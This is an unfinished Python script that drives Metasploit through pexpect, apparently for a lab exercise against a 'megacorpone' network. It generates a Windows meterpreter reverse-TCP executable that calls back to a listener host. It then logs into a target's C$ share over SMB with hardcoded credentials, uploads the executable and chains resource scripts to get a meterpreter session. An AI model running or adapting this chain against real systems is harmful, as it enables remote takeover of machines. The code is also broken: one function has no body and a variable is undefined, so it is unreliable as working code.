#!/usr/bin/python3
import pexpect
import os
import logging
import time

LOG_FILE = 'msfscript_log.txt'

RESOURCE_SCRIPTS = [
    '~/resource1.rc',
    '~/resource2.rc',
    '~/resource3.rc',
    '~/resource4.rc',
    '~/resource5.rc'
]

# Configure logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def log_info(message):
    logging.info(message)
    print(message)

def log_error(message):
    logging.error(message)
    print(f'[ERROR] {message}')

def generate_msfshell_exe(process):
    filename = 'msfshell.exe'

    if os.path.exists(filename):
        print("File already exists")
    else:
        msfvenom_command = f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > {filename}'
        execute_command(msfvenom_command, process)
        print("File not found - creating")

#addition
def execute_command(command, process):

def main():
    try:
        print ("INITIALISING")
        print ("WELCOME")

        log_info('Generating msfshell.exe...')
        generate_msfshell_exe(process)
        
        print("Starting msfconsole")
        msf_script = pexpect.spawn('msfconsole', encoding='utf-8')

        msf_script.expect('msf6', timeout=120)
        print ("SKIPPING SMB LOGIN - TIME CONSTRAINTS")
        print ("RUNNING RESOURCE1.RC")

        command = 'resource resource1.rc'
        log_info('resource1.rc')
        msf_script.sendline(command)
        msf_script.expect('auxiliary', timeout=120)
        log_info('RESOURCE1.RC COMPLETE - BEGINNING SMBCLIENT')

        #SMB client put shell.exe
        command = 'smbclient //172.22.117.20/C$ -U megacorpone/tstark'
        log_info('smbclient')
        msf_script.sendline(command)
        time.sleep(5)
        log_info('ENTERING PASSWORD')
        msf_script.sendline('Password!')
        msf_script.expect('smb')
        log_info('PUTTING .EXE ON TARGET MACHINE')
        msf_script.sendline('put msfshell.exe')
        log_info('SUCCESS')
        msf_script.expect('smb')
        msf_script.sendline('exit')
        msf_script.expect('auxiliary')
        log_info('exiting')

        command = 'resource resource2.rc'
        log_info('resource2.rc')
        msf_script.sendline(command)
        msf_script.expect_exact('meterpreter >', timeout=240)
        log_info('Meterpreter session active, send to background')
        msf_script.sendline('background')
        msf_script.expect('auxiliary')
        
        command = 'resource resource3.rc'
        log_info('resource3.rc')
                #github up to here

    except Exception as e:
        log_error(str(e))


if __name__ == "__main__":
    main()

















